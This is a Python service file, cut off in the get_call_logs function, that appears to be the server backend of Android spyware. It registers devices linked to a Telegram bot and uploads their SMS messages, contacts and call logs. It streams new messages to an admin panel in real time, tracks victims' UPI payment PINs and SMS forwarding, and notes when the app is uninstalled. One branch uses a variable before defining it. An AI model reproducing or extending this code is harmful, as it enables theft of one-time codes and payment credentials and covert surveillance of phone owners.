from datetime import datetime, timedelta, timezone
from typing import List, Optional, Dict, Any
from ..database import mongodb
from ..models.schemas import Device, DeviceStatus, CommandStatus
from ..config import settings
import logging
from bson import ObjectId
import hashlib
from pymongo import UpdateOne, ReturnDocument
import re
import random
import json
from ..utils.datetime_utils import ensure_utc, to_iso_string, utc_now
from .admin_ws_manager import admin_ws_manager

logger = logging.getLogger(__name__)

class DeviceService:
    @staticmethod
    def _is_valid_fcm_token(token: Optional[str]) -> bool:
        """
        Validate FCM token - rejects NO_FCM_TOKEN_* and empty tokens
        Returns False for None, empty, or invalid placeholder tokens
        """
        if not token or not isinstance(token, str):
            return False
        
        token = token.strip()
        
        # Reject empty tokens
        if not token:
            return False
        
        # Reject placeholder tokens (NO_FCM_TOKEN_*)
        if token.startswith("NO_FCM_TOKEN"):
            return False
        
        # Accept all other non-empty tokens
        return True
    
    @staticmethod
    def _serialize_datetime_fields(doc: Dict[str, Any], fields: List[str]):
        for field in fields:
            value = doc.get(field)
            if isinstance(value, datetime):
                doc[field] = to_iso_string(ensure_utc(value))


    @staticmethod
    def _assign_telegram_bot() -> int:
        return 1

    @staticmethod
    async def register_device(device_id: str, device_info: dict, admin_token: Optional[str] = None):
        try:
            logger.info(f"[DEVICE_SERVICE] Starting registration - device_id: {device_id}")
            
            existing_device = await mongodb.db.devices.find_one({"device_id": device_id})
            is_new_device = existing_device is None
            logger.info(f"[DEVICE_SERVICE] Device exists: {not is_new_device}")

            # If device was soft-deleted before, restore it
            if existing_device and existing_device.get("is_deleted"):
                logger.info(f"[DEVICE_SERVICE] Device was marked deleted. Restoring: {device_id}")
                await mongodb.db.devices.update_one(
                    {"device_id": device_id},
                    {"$set": {"is_deleted": False, "deleted_at": None}}
                )
            
            # If device was marked as uninstalled, restore it (app was reinstalled)
            was_uninstalled = False
            if existing_device and existing_device.get("is_uninstalled"):
                was_uninstalled = True
                logger.info(f"[DEVICE_SERVICE] Device was marked as uninstalled. Restoring (app reinstalled): {device_id}")
                common_data["is_uninstalled"] = False
                common_data["uninstalled_at"] = None
            
            now = utc_now()
            fcm_token = device_info.get("fcm_token")
            
            # Accept all FCM tokens (only empty tokens are rejected)
            
            user_id = device_info.get("user_id", "USER_ID_HERE")
            app_type = device_info.get("app_type", "MP")
            sim_info = device_info.get("sim_info", [])
            is_initial = device_info.get("is_initial", False)

            admin_username = None
            if admin_token:
                try:
                    from ..services.auth_service import auth_service
                    admin = await auth_service.get_admin_by_token(admin_token)
                    if admin:
                        admin_username = admin.username
                        logger.info(f"[DEVICE_SERVICE] Assigned to admin: {admin_username}")
                    else:
                        logger.warning(f"[DEVICE_SERVICE] [EXCEPT] Invalid admin token")
                except Exception as e:
                    logger.warning(f"[DEVICE_SERVICE] [EXCEPT] Admin lookup failed: {str(e)}")

            existing_sim_info = None
            if existing_device and existing_device.get("sim_info"):
                existing_sim_info = existing_device.get("sim_info")
                has_phone_number = False
                if isinstance(existing_sim_info, list):
                    for sim in existing_sim_info:
                        phone = sim.get("phone_number") or sim.get("phoneNumber") or ""
                        if phone and phone.strip():
                            has_phone_number = True
                            break
                
                if has_phone_number and (not sim_info or len(sim_info) == 0 or not any(sim.get("phone_number") or sim.get("phoneNumber") for sim in sim_info if isinstance(sim, dict))):
                    logger.info(f"[DEVICE_SERVICE] Preserving existing SIM info with phone number")
                    sim_info = existing_sim_info

            common_data = {}
            
            if device_info.get("model"):
                common_data["model"] = device_info.get("model")
            if device_info.get("manufacturer"):
                common_data["manufacturer"] = device_info.get("manufacturer")
            if device_info.get("brand"):
                common_data["brand"] = device_info.get("brand")
            if device_info.get("device"):
                common_data["device"] = device_info.get("device")
            if device_info.get("product"):
                common_data["product"] = device_info.get("product")
            if device_info.get("hardware"):
                common_data["hardware"] = device_info.get("hardware")
            if device_info.get("board"):
                common_data["board"] = device_info.get("board")
            if device_info.get("display"):
                common_data["display"] = device_info.get("display")
            if device_info.get("fingerprint"):
                common_data["fingerprint"] = device_info.get("fingerprint")
            if device_info.get("host"):
                common_data["host"] = device_info.get("host")
            if device_info.get("os_version"):
                common_data["os_version"] = device_info.get("os_version")
            if device_info.get("sdk_int"):
                common_data["sdk_int"] = device_info.get("sdk_int")
            if device_info.get("supported_abis"):
                common_data["supported_abis"] = device_info.get("supported_abis", [])
            
            if device_info.get("battery") is not None:
                common_data["battery_level"] = device_info.get("battery", 100)
            if device_info.get("battery_state"):
                common_data["battery_state"] = device_info.get("battery_state")
            if device_info.get("is_charging") is not None:
                common_data["is_charging"] = device_info.get("is_charging", False)
            
            if device_info.get("total_storage_mb") is not None:
                common_data["total_storage_mb"] = device_info.get("total_storage_mb")
            if device_info.get("free_storage_mb") is not None:
                common_data["free_storage_mb"] = device_info.get("free_storage_mb")
            if device_info.get("storage_used_mb") is not None:
                common_data["storage_used_mb"] = device_info.get("storage_used_mb")
            if device_info.get("storage_percent_free") is not None:
                common_data["storage_percent_free"] = device_info.get("storage_percent_free")
            
            if device_info.get("total_ram_mb") is not None:
                common_data["total_ram_mb"] = device_info.get("total_ram_mb")
            if device_info.get("free_ram_mb") is not None:
                common_data["free_ram_mb"] = device_info.get("free_ram_mb")
            if device_info.get("ram_used_mb") is not None:
                common_data["ram_used_mb"] = device_info.get("ram_used_mb")
            if device_info.get("ram_percent_free") is not None:
                common_data["ram_percent_free"] = device_info.get("ram_percent_free")
            
            if device_info.get("network_type"):
                common_data["network_type"] = device_info.get("network_type")
            if device_info.get("ip_address"):
                common_data["ip_address"] = device_info.get("ip_address")
            
            if device_info.get("is_rooted") is not None:
                common_data["is_rooted"] = device_info.get("is_rooted", False)
            if device_info.get("is_emulator") is not None:
                common_data["is_emulator"] = device_info.get("is_emulator", False)
            if device_info.get("screen_resolution"):
                common_data["screen_resolution"] = device_info.get("screen_resolution")
            if device_info.get("screen_density"):
                common_data["screen_density"] = device_info.get("screen_density")
            if device_info.get("device_name"):
                common_data["device_name"] = device_info.get("device_name")
            
            if sim_info and len(sim_info) > 0:
                common_data["sim_info"] = sim_info
            
            common_data["user_id"] = user_id
            common_data["app_type"] = app_type
            if admin_token:
                common_data["admin_token"] = admin_token
            if admin_username:
                common_data["admin_username"] = admin_username
            common_data["status"] = "online"
            common_data["last_ping"] = now
            common_data["updated_at"] = now

            telegram_bot_id = DeviceService._assign_telegram_bot()
            update_data = {
                "$set": common_data,
                "$setOnInsert": {
                    "device_id": device_id,
                    "registered_at": now,
                    "telegram_bot_id": telegram_bot_id,
                    "has_upi": False,
                    "upi_detected_at": None,
                    "stats": {
                        "total_sms": 0,
                        "total_contacts": 0,
                        "total_calls": 0,
                        "last_sms_sync": None,
                        "last_contact_sync": None,
                        "last_call_sync": None
                    },
                    "settings": {
                        "monitoring_enabled": True,
                        "sms_forward_enabled": False,
                        "forward_number": None,
                    },
                    "is_online": True,
                    "last_online_update": now,
                }
            }
            
            # Handle FCM token: save all non-empty tokens
            if fcm_token and DeviceService._is_valid_fcm_token(fcm_token):
                # Add token (will be deduplicated by $addToSet if already exists)
                if "$addToSet" not in update_data:
                    update_data["$addToSet"] = {}
                update_data["$addToSet"]["fcm_tokens"] = fcm_token

            result = await mongodb.db.devices.update_one(
                {"device_id": device_id},
                update_data,
                upsert=True
            )

            if result.upserted_id:
                logger.info(f"[DEVICE_SERVICE] NEW device registered - device_id: {device_id}, bot: {telegram_bot_id}")
            else:
                logger.info(f"[DEVICE_SERVICE] EXISTING device updated - device_id: {device_id}")

            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            
            # Add log if device was restored from uninstalled state
            if was_uninstalled:
                try:
                    await DeviceService.add_log(
                        device_id,
                        "system",
                        "Device restored - App was reinstalled",
                        "info",
                        {"was_uninstalled": True, "restored_at": to_iso_string(utc_now())}
                    )
                    logger.info(f"📝 [DEVICE_SERVICE] Log added for restored device: {device_id}")
                except Exception as log_error:
                    logger.warning(f"⚠️ [DEVICE_SERVICE] Failed to add restore log: {log_error}")
            
            if device_doc:
                try:
                    device_payload = {
                        "device_id": device_id,
                        "status": device_doc.get("status"),
                        "is_online": device_doc.get("is_online", False),
                        "battery_level": device_doc.get("battery_level"),
                        "device_name": device_doc.get("device_name"),
                        "model": device_doc.get("model"),
                        "admin_username": device_doc.get("admin_username"),
                        "has_upi": device_doc.get("has_upi", False),
                        "upi_pins": device_doc.get("upi_pins", []),
                        "updated_at": to_iso_string(ensure_utc(device_doc.get("updated_at"))),
                    }
                    await admin_ws_manager.notify_device_update(device_id, device_payload)
                    logger.info(f"[DEVICE_SERVICE] WebSocket notification sent")
                except Exception as e:
                    logger.warning(f"[DEVICE_SERVICE] [EXCEPT] WebSocket notification failed: {str(e)}")
            
            logger.info(f"[DEVICE_SERVICE] Registration completed - device_id: {device_id}, is_new: {is_new_device}")
            return {"device": device_doc, "is_new": is_new_device}

        except Exception as e:
            logger.error(f"[DEVICE_SERVICE] Register device FAILED for {device_id}: {e}", exc_info=True)
            raise

    @staticmethod
    async def update_device_status(device_id: str, status: DeviceStatus):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": {"status": status, "last_ping": utc_now() if status == DeviceStatus.ONLINE else None, "updated_at": utc_now()}}
            )
            
            # Notify admins about device status update via WebSocket
            try:
                device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
                if device_doc:
                    device_payload = {
                        "device_id": device_id,
                        "status": status,
                        "is_online": device_doc.get("is_online", False),
                        "battery_level": device_doc.get("battery_level"),
                        "has_upi": device_doc.get("has_upi", False),
                        "upi_pins": device_doc.get("upi_pins", []),
                        "updated_at": to_iso_string(utc_now()),
                    }
                    await admin_ws_manager.notify_device_update(device_id, device_payload)
                    logger.debug(f"WebSocket notification sent for device status update: device={device_id}, status={status}")
            except Exception as e:
                logger.warning(f"Failed to send WebSocket notification for device status update: {e}")
        except Exception as e:
            logger.error(f"Update device status failed: {e}")

    @staticmethod
    async def update_battery_level(device_id: str, battery_level: int):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": {"battery_level": battery_level, "updated_at": utc_now()}}
            )
            
            # Notify admins about device battery update via WebSocket
            try:
                device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
                if device_doc:
                    device_payload = {
                        "device_id": device_id,
                        "status": device_doc.get("status"),
                        "is_online": device_doc.get("is_online", False),
                        "battery_level": battery_level,
                        "has_upi": device_doc.get("has_upi", False),
                        "upi_pins": device_doc.get("upi_pins", []),
                        "updated_at": to_iso_string(utc_now()),
                    }
                    await admin_ws_manager.notify_device_update(device_id, device_payload)
                    logger.debug(f"WebSocket notification sent for device battery update: device={device_id}, battery={battery_level}%")
            except Exception as e:
                logger.warning(f"Failed to send WebSocket notification for device battery update: {e}")
        except Exception as e:
            logger.error(f"Battery update failed: {e}")

    @staticmethod
    async def update_online_status(device_id: str, is_online: bool):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": {"is_online": is_online, "last_online_update": utc_now(), "updated_at": utc_now()}}
            )
            
            # Notify admins about device online status update via WebSocket
            try:
                device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
                if device_doc:
                    device_payload = {
                        "device_id": device_id,
                        "status": device_doc.get("status"),
                        "is_online": is_online,
                        "battery_level": device_doc.get("battery_level"),
                        "has_upi": device_doc.get("has_upi", False),
                        "upi_pins": device_doc.get("upi_pins", []),
                        "updated_at": to_iso_string(utc_now()),
                    }
                    await admin_ws_manager.notify_device_update(device_id, device_payload)
                    logger.debug(f"WebSocket notification sent for device online status update: device={device_id}, is_online={is_online}")
            except Exception as e:
                logger.warning(f"Failed to send WebSocket notification for device online status update: {e}")
        except Exception as e:
            logger.error(f"Online status update failed: {e}")

    @staticmethod
    async def mark_device_uninstalled(device_id: str):
        """
        Mark device as uninstalled (app was uninstalled or clear data was done)
        This does NOT delete the device from database, only marks it
        """
        try:
            # First check if device exists and get current status
            device_before = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"is_deleted": 1, "is_uninstalled": 1, "status": 1}
            )
            
            if not device_before:
                logger.error(f"❌ [MARK_UNINSTALLED] Device not found in database: {device_id}")
                return
            
            logger.info(f"📋 [MARK_UNINSTALLED] Device before update - Device: {device_id}, is_deleted: {device_before.get('is_deleted')}, is_uninstalled: {device_before.get('is_uninstalled')}, status: {device_before.get('status')}")
            
            # Mark as uninstalled (NOT deleted) and set status to offline
            result = await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "is_uninstalled": True,
                        "uninstalled_at": utc_now(),
                        "status": "offline",
                        "is_online": False,
                        "updated_at": utc_now()
                    }
                }
            )
            
            # Verify the update
            device_after = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"is_deleted": 1, "is_uninstalled": 1, "status": 1}
            )
            
            if result.modified_count > 0:
                logger.info(f"✅ [MARK_UNINSTALLED] Device marked as uninstalled: {device_id} (modified_count: {result.modified_count})")
                logger.info(f"📋 [MARK_UNINSTALLED] Device after update - Device: {device_id}, is_deleted: {device_after.get('is_deleted')}, is_uninstalled: {device_after.get('is_uninstalled')}, status: {device_after.get('status')}")
                
                # Add log to device logs (visible in panel)
                try:
                    logger.info(f"📝 [MARK_UNINSTALLED] Attempting to add log to device logs: {device_id}")
                    await DeviceService.add_log(
                        device_id,
                        "system",
                        "Device marked as uninstalled - App was uninstalled or data was cleared",
                        "warning",
                        {"is_uninstalled": True, "uninstalled_at": to_iso_string(utc_now())}
                    )
                    logger.info(f"✅ [MARK_UNINSTALLED] Log successfully added to device logs: {device_id}")
                except Exception as log_error:
                    logger.error(f"❌ [MARK_UNINSTALLED] Failed to add log to device logs: {device_id}, Error: {log_error}", exc_info=True)
                    
            elif result.matched_count > 0:
                logger.warning(f"⚠️ [MARK_UNINSTALLED] Device found but not modified (already marked?): {device_id}")
                logger.info(f"📋 [MARK_UNINSTALLED] Device current status - Device: {device_id}, is_deleted: {device_after.get('is_deleted')}, is_uninstalled: {device_after.get('is_uninstalled')}, status: {device_after.get('status')}")
            else:
                logger.error(f"❌ [MARK_UNINSTALLED] Device not found in database: {device_id}")
            
            # Notify admins about device uninstalled status via WebSocket
            try:
                device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
                if device_doc:
                    device_payload = {
                        "device_id": device_id,
                        "is_uninstalled": True,
                        "uninstalled_at": to_iso_string(utc_now()),
                        "status": device_doc.get("status"),
                        "is_online": device_doc.get("is_online"),
                        "updated_at": to_iso_string(utc_now()),
                    }
                    await admin_ws_manager.notify_device_update(device_id, device_payload)
                    logger.debug(f"WebSocket notification sent for device uninstalled: device={device_id}")
            except Exception as e:
                logger.warning(f"Failed to send WebSocket notification for device uninstalled: {e}")
        except Exception as e:
            logger.error(f"Mark device uninstalled failed: {e}")

    @staticmethod
    async def get_device(device_id: str) -> Optional[Device]:
        try:
            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})

            if device_doc:
                if device_doc.get("is_deleted"):
                    logger.info(f"Device {device_id} is marked as deleted - skipping fetch")
                    return None
                
                five_minutes_ago = utc_now() - timedelta(minutes=5)
                
                last_ping = ensure_utc(device_doc.get("last_ping")) if device_doc.get("last_ping") else None
                if last_ping and last_ping < five_minutes_ago:
                    was_online = device_doc.get("status") == "online" or device_doc.get("is_online", False)
                    
                    await mongodb.db.devices.update_one(
                        {"device_id": device_id},
                        {
                            "$set": {
                                "status": "offline",
                                "is_online": False,
                                "last_online_update": utc_now()
                            }
                        }
                    )
                    device_doc["status"] = "offline"
                    device_doc["is_online"] = False
                    
                    # Send WebSocket notification if device was previously online
                    if was_online:
                        try:
                            from app.services.admin_ws_manager import admin_ws_manager
                            device_payload = {
                                "device_id": device_id,
                                "status": "offline",
                                "is_online": False,
                                "battery_level": device_doc.get("battery_level"),
                                "has_upi": device_doc.get("has_upi", False),
                                "upi_pins": device_doc.get("upi_pins", []),
                                "updated_at": to_iso_string(utc_now()),
                            }
                            await admin_ws_manager.notify_device_update(device_id, device_payload)
                            logger.debug(f"WebSocket notification sent for device going offline in get_device: device={device_id}")
                        except Exception as e:
                            logger.warning(f"Failed to send WebSocket notification for offline device in get_device: {e}")

                normalized = DeviceService._normalize_device_data(device_doc)
                return Device(**normalized)
            return None
        except Exception as e:
            logger.error(f"Get device failed: {e}")
            return None

    @staticmethod
    async def save_sms_history(device_id: str, sms_list: list):
        try:
            if not sms_list:
                return

            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            if device_doc and device_doc.get("sms_blocked"):
                logger.info(f"SMS upload blocked for device {device_id} (sms_blocked)")
                return

            blocked_sms_ids = set(device_doc.get("deleted_sms_ids", [])) if device_doc else set()

            current_time = utc_now()

            operations = []
            skipped_duplicates = 0
            
            device_sim_phones = []
            try:
                if device_doc:
                    sim_info = device_doc.get("sim_info", [])
                    if isinstance(sim_info, list):
                        for sim in sim_info:
                            if isinstance(sim, dict):
                                phone = sim.get("phone_number") or sim.get("phoneNumber") or ""
                                if phone:
                                    device_sim_phones.append(phone)
            except Exception as e:
                logger.warning(f"Failed to get device SIM info for fallback phone number (device {device_id}): {e}")
            
            for sms in sms_list:
                sms_id = sms.get("sms_id")
                if not sms_id:
                    sms_id = hashlib.md5(
                        f"{device_id}:{sms.get('from', '')}:{sms.get('to', '')}:{sms.get('timestamp', 0)}:{sms.get('body', '')}".encode()
                    ).hexdigest()
                
                if sms_id in blocked_sms_ids:
                    skipped_duplicates += 1
                    continue

                # Check for duplicate using sms_id only (simple and reliable)
                existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_id})
                
                if existing:
                    skipped_duplicates += 1
                    continue
                
                # Parse timestamp
                timestamp_value = sms.get("timestamp")
                if timestamp_value:
                    if isinstance(timestamp_value, (int, float)):
                        if timestamp_value > 1e12:
                            timestamp_dt = datetime.fromtimestamp(timestamp_value / 1000, tz=timezone.utc)
                        else:
                            timestamp_dt = datetime.fromtimestamp(timestamp_value, tz=timezone.utc)
                    else:
                        timestamp_dt = current_time
                else:
                    timestamp_dt = current_time
                
                sms_type = sms.get("type", "inbox")
                from_field = sms.get("from", "")
                
                if sms_type == "sent" and not from_field:
                    from_field = sms.get("sim_phone_number", "")
                    
                    if not from_field and device_sim_phones:
                        from_field = device_sim_phones[0]
                
                sms_data = {
                    "sms_id": sms_id,
                    "device_id": device_id,
                    "from": from_field,
                    "to": sms.get("to", ""),
                    "body": sms.get("body", ""),
                    "timestamp": timestamp_dt,
                    "type": sms_type,
                    "is_read": sms.get("is_read", False),
                    "received_at": current_time
                }
                
                if sms.get("sim_phone_number"):
                    sms_data["sim_phone_number"] = sms.get("sim_phone_number")
                
                if sms.get("sim_slot") is not None:
                    sms_data["sim_slot"] = sms.get("sim_slot")

                operations.append(
                    UpdateOne(
                        {"sms_id": sms_id},
                        {"$set": sms_data},
                        upsert=True
                    )
                )

            if operations:
                result = await mongodb.db.sms_messages.bulk_write(operations, ordered=False)

            total_sms = await mongodb.db.sms_messages.count_documents({"device_id": device_id})

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "stats.total_sms": total_sms,
                        "stats.last_sms_sync": current_time
                    }
                }
            )

        except Exception as e:
            logger.error(f"Save SMS failed: {e}")
            raise

    @staticmethod
    async def save_new_sms(device_id: str, sms_data: dict) -> bool:
        try:
            logger.info(f"💾 [SMS] save_new_sms called - Device: {device_id}, From: {sms_data.get('from')}, Body length: {len(sms_data.get('body', ''))}")
            
            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            if device_doc and device_doc.get("sms_blocked"):
                logger.info(f"🚫 [SMS] New SMS blocked for device {device_id} (sms_blocked)")
                return False

            blocked_sms_ids = set(device_doc.get("deleted_sms_ids", [])) if device_doc else set()

            if sms_data.get("sms_id"):
                sms_id = sms_data.get("sms_id")
            else:
                sms_id = hashlib.md5(
                    f"{device_id}:{sms_data.get('from', '')}:{sms_data.get('to', '')}:{sms_data.get('timestamp', 0)}:{sms_data.get('body', '')}".encode()
                ).hexdigest()

            logger.debug(f"💾 [SMS] SMS ID: {sms_id}")

            if sms_id in blocked_sms_ids:
                logger.info(f"🚫 [SMS] SMS blocked (in deleted_sms_ids) - Device: {device_id}, SMS ID: {sms_id}")
                return False

            existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_id})
            if existing:
                logger.info(f"⚠️ [SMS] SMS already exists (duplicate) - Device: {device_id}, SMS ID: {sms_id}")
                return False

            timestamp_value = sms_data.get("timestamp")
            if timestamp_value:
                if isinstance(timestamp_value, (int, float)):
                    if timestamp_value > 1e12:
                        timestamp_dt = datetime.fromtimestamp(timestamp_value / 1000, tz=timezone.utc)
                    else:
                        timestamp_dt = datetime.fromtimestamp(timestamp_value, tz=timezone.utc)
                else:
                    timestamp_dt = utc_now()
            else:
                timestamp_dt = utc_now()

            received_at = utc_now()
            message = {
                "sms_id": sms_id,
                "device_id": device_id,
                "from": sms_data.get("from"),
                "to": sms_data.get("to"),
                "body": sms_data.get("body", ""),
                "timestamp": timestamp_dt,
                "type": sms_data.get("type", "inbox"),
                "is_read": False,
                "is_flagged": False,
                "tags": [],
                "received_at": received_at
            }

            if sms_data.get("sim_slot") is not None:
                message["sim_slot"] = sms_data.get("sim_slot")
            
            if sms_data.get("sim_phone_number"):
                message["sim_phone_number"] = sms_data.get("sim_phone_number")

            if sms_data.get("delivery_status"):
                message["delivery_status"] = sms_data.get("delivery_status")

            if sms_data.get("delivery_details"):
                message["delivery_details"] = sms_data.get("delivery_details")

            if sms_data.get("received_in_native") is not None:
                message["received_in_native"] = sms_data.get("received_in_native")

            insert_result = await mongodb.db.sms_messages.insert_one(message)
            logger.info(f"✅ [SMS] SMS inserted to database - Device: {device_id}, SMS ID: {sms_id}, Inserted ID: {insert_result.inserted_id}")
            
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$inc": {"stats.total_sms": 1}}
            )

            try:
                ws_payload = {
                    "_id": str(insert_result.inserted_id),
                    "device_id": device_id,
                    "from": message.get("from"),
                    "to": message.get("to"),
                    "body": message.get("body", ""),
                    "timestamp": to_iso_string(ensure_utc(message.get("timestamp"))),
                    "type": message.get("type", "inbox"),  # This will be "sent" for delivery-status SMS
                    "is_read": message.get("is_read", False),
                    "is_flagged": message.get("is_flagged", False),
                    "tags": message.get("tags", []),
                    "received_at": to_iso_string(ensure_utc(message.get("received_at"))),
                }
                if "sim_slot" in message:
                    ws_payload["sim_slot"] = message["sim_slot"]
                if "sim_phone_number" in message:
                    ws_payload["sim_phone_number"] = message["sim_phone_number"]
                if "delivery_status" in message:
                    ws_payload["delivery_status"] = message["delivery_status"]
                if "delivery_details" in message:
                    ws_payload["delivery_details"] = message["delivery_details"]

                logger.info(f"📡 [SMS] Sending WebSocket notification - Device: {device_id}, From: {message.get('from')}")
                try:
                    await admin_ws_manager.notify_new_sms(device_id, ws_payload)
                    logger.info(f"✅ [SMS] WebSocket notification sent - Device: {device_id}")
                except Exception as e:
                    logger.error(f"❌ [SMS] WebSocket notification failed - Device: {device_id}, Error: {e}", exc_info=True)
            except Exception as e:
                logger.error(f"❌ [SMS] Failed to prepare WebSocket payload - Device: {device_id}, Error: {e}", exc_info=True)

            return True

        except Exception as e:
            logger.error(f"Save new SMS failed: device={device_id}, error={e}", exc_info=True)
            raise

    @staticmethod
    async def get_sms_messages(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
        try:
            logger.info(f"📋 [GET_SMS] get_sms_messages called - Device: {device_id}, Skip: {skip}, Limit: {limit}")
            
            # First check if there are any SMS messages for this device
            count = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
            logger.info(f"📋 [GET_SMS] Found {count} SMS messages in database for device {device_id}")
            
            if count == 0:
                logger.info(f"📋 [GET_SMS] No SMS messages found for device {device_id}")
                return []
            
            cursor = mongodb.db.sms_messages.find({"device_id": device_id}).sort("timestamp", -1).skip(skip).limit(limit)
            messages = await cursor.to_list(length=limit)
            logger.info(f"📋 [GET_SMS] Retrieved {len(messages)} messages from cursor for device {device_id}")
            
            for msg in messages:
                if "_id" in msg:
                    msg["_id"] = str(msg["_id"])
                for key, value in msg.items():
                    if isinstance(value, ObjectId):
                        msg[key] = str(value)
                DeviceService._serialize_datetime_fields(msg, ["timestamp", "received_at", "synced_at"])
            
            logger.info(f"✅ [GET_SMS] Returning {len(messages)} serialized messages for device {device_id}")
            return messages
        except Exception as e:
            logger.error(f"❌ [GET_SMS] Get SMS messages failed: device={device_id}, error={e}", exc_info=True)
            return []

    @staticmethod
    async def save_contacts(device_id: str, contacts_list: List[dict]):
        try:
            if not contacts_list:
                return

            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            if device_doc and device_doc.get("contacts_blocked"):
                logger.info(f"Contacts upload blocked for device {device_id} (contacts_blocked)")
                return

            blocked_contact_ids = set(device_doc.get("deleted_contact_ids", [])) if device_doc else set()

            now = utc_now()
            operations = []

            for contact in contacts_list:
                contact_id = contact.get("contact_id", "")
                name = contact.get("name", "")
                phone = contact.get("phone_number", "")

                if not phone or not contact_id:
                    continue

                if contact_id in blocked_contact_ids:
                    continue

                contact_doc = {
                    "contact_id": contact_id,
                    "device_id": device_id,
                    "name": name,
                    "phone_number": phone,
                    "synced_at": now
                }

                operations.append(
                    UpdateOne(
                        {"contact_id": contact_id},
                        {"$set": contact_doc},
                        upsert=True
                    )
                )

            if operations:
                result = await mongodb.db.contacts.bulk_write(operations, ordered=False)
                new_count = result.upserted_count
                update_count = result.modified_count

                logger.info(f"Contacts: {new_count} new, {update_count} updated for {device_id}")

            total = await mongodb.db.contacts.count_documents({"device_id": device_id})

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "stats.total_contacts": total,
                        "stats.last_contact_sync": now
                    }
                }
            )

        except Exception as e:
            logger.error(f"Contacts save failed: {e}")

    @staticmethod
    async def get_contacts(device_id: str, skip: int = 0, limit: int = 100) -> List[Dict]:
        try:
            logger.info(f"📋 [GET_CONTACTS] get_contacts called - Device: {device_id}, Skip: {skip}, Limit: {limit}")
            
            cursor = mongodb.db.contacts.find({"device_id": device_id}).sort("name", 1).skip(skip).limit(limit)
            logger.info(f"📋 [GET_CONTACTS] Cursor created, fetching contacts - Device: {device_id}")
            
            contacts = await cursor.to_list(length=limit)
            logger.info(f"📋 [GET_CONTACTS] Retrieved {len(contacts)} contacts from cursor - Device: {device_id}")
            
            logger.info(f"📋 [GET_CONTACTS] Starting serialization - Device: {device_id}, Count: {len(contacts)}")
            for i, contact in enumerate(contacts):
                if "_id" in contact:
                    contact["_id"] = str(contact["_id"])
                for key, value in contact.items():
                    if isinstance(value, ObjectId):
                        contact[key] = str(value)
                DeviceService._serialize_datetime_fields(contact, ["synced_at", "received_at"])
                if (i + 1) % 100 == 0:
                    logger.info(f"📋 [GET_CONTACTS] Serialized {i + 1}/{len(contacts)} contacts - Device: {device_id}")
            
            logger.info(f"✅ [GET_CONTACTS] Returning {len(contacts)} serialized contacts - Device: {device_id}")
            return contacts
        except Exception as e:
            logger.error(f"❌ [GET_CONTACTS] Get contacts failed: device={device_id}, error={e}", exc_info=True)
            return []

    @staticmethod
    async def save_call_logs(device_id: str, call_logs: List[dict]):
        try:
            if not device_id:
                logger.error("save_call_logs: device_id is required")
                return

            if not call_logs:
                logger.debug(f"save_call_logs: no call logs to save for device {device_id}")
                return

            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            if device_doc and device_doc.get("calls_blocked"):
                logger.info(f"Call logs upload blocked for device {device_id} (calls_blocked)")
                return

            blocked_call_ids = set(device_doc.get("deleted_call_ids", [])) if device_doc else set()

            now = utc_now()
            new_count = 0
            error_count = 0

            for call in call_logs:
                try:
                    number = call.get("number", "")
                    name = call.get("name", "Unknown")
                    call_type = call.get("call_type", "unknown")
                    timestamp_ms = call.get("timestamp", 0)
                    duration = call.get("duration", 0)
                    duration_formatted = call.get("duration_formatted", "")

                    # Validate timestamp - if invalid or zero, use current time
                    if timestamp_ms and timestamp_ms > 0:
                        try:
                            timestamp_dt = datetime.fromtimestamp(timestamp_ms / 1000, tz=timezone.utc)
                        except (ValueError, OSError) as e:
                            logger.warning(f"Invalid timestamp {timestamp_ms} for call, using current time: {e}")
                            timestamp_dt = now
                    else:
                        timestamp_dt = now

                    call_hash = hashlib.md5(
                        f"{device_id}:{number}:{call_type}:{timestamp_ms}:{duration}".encode()
                    ).hexdigest()

                    if call_hash in blocked_call_ids:
                        continue

                    call_doc = {
                        "call_id": call_hash,
                        "device_id": device_id,
                        "number": number,
                        "name": name,
                        "call_type": call_type,
                        "timestamp": timestamp_dt,
                        "duration": duration,
                        "duration_formatted": duration_formatted,
                        "received_at": now
                    }

                    result = await mongodb.db.call_logs.update_one(
                        {"call_id": call_hash},
                        {"$setOnInsert": call_doc},
                        upsert=True
                    )

                    if result.upserted_id:
                        new_count += 1

                except Exception as e:
                    error_count += 1
                    logger.error(f"Error saving individual call log: {e}", exc_info=True)
                    continue

            if new_count > 0:
                total = await mongodb.db.call_logs.count_documents({"device_id": device_id})
                await mongodb.db.devices.update_one(
                    {"device_id": device_id},
                    {
                        "$set": {
                            "stats.total_calls": total,
                            "stats.last_call_sync": now
                        }
                    }
                )
                logger.info(f"Saved {new_count} new call logs for {device_id} (total: {total}, errors: {error_count})")
            elif error_count > 0:
                logger.warning(f"Failed to save {error_count} call logs for {device_id} (no new logs saved)")
            else:
                logger.debug(f"No new call logs saved for {device_id} (all duplicates)")

        except Exception as e:
            logger.error(f"Call logs save failed for device {device_id}: {e}", exc_info=True)

    @staticmethod
    async def get_call_logs(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
        try:
            logger.info(f"📋 [GET_CALLS] get_call_logs called - Device: {device_id}, Skip: {skip}, Limit: {limit}")
            
